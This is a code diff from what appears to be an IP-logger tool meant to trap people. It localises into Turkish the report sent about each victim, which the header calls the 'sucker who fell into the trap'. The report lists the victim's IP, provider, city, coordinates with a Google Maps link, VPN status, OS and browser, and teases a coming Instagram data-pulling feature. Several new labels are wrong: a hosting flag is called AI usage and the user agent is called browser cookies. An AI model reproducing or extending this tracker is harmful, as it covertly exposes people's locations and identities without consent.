@@ -146,24 +146,25 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
 **Tuzağa Düşen Lavuğun Bilgiler:** `{endpoint}`
             
-**IP Info:**
-> **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
-> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
-> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
-> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
-> **City:** `{info['city'] if info['city'] else 'Unknown'}`
-> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
-> **Mobile:** `{info['mobile']}`
-> **VPN:** `{info['proxy']}`
-> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
+**IP Bilgileri:**
+> **IP :** `{ip if ip else 'Unknown'}`
+> **İnternet Sağlayıcısı :** `{info['isp'] if info['isp'] else 'Unknown'}`
+> **Veri No :** `{info['as'] if info['as'] else 'Unknown'}`
+> **Ülke :** `{info['country'] if info['country'] else 'Unknown'}`
+> **Şehir :** `{info['regionName'] if info['regionName'] else 'Unknown'}`
+> **İlçe :** `{info['city'] if info['city'] else 'Unknown'}`
+> **Kordinatlar :** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
+> **Zaman Dilimi :** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
+> **Mobil :** `{info['mobile']}`
+> **VPN Kullanımı :** `{info['proxy']}`
+> **Yapay Zeka Kullanımı :** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
+> **İnstagram Bilgi Çekme (Yakında) :** `Not Enabled This Feature.`
 
-**PC Info:**
-> **OS:** `{os}`
-> **Browser:** `{browser}`
+**PC Bilgileri:**
+> **Windows Bilgileri :** `{os}`
+> **Tarayıcı :** `{browser}`
 
-**User Agent:**
+**Tarayıcı Çerezleri:**
 ```
 {useragent}
 ```""",
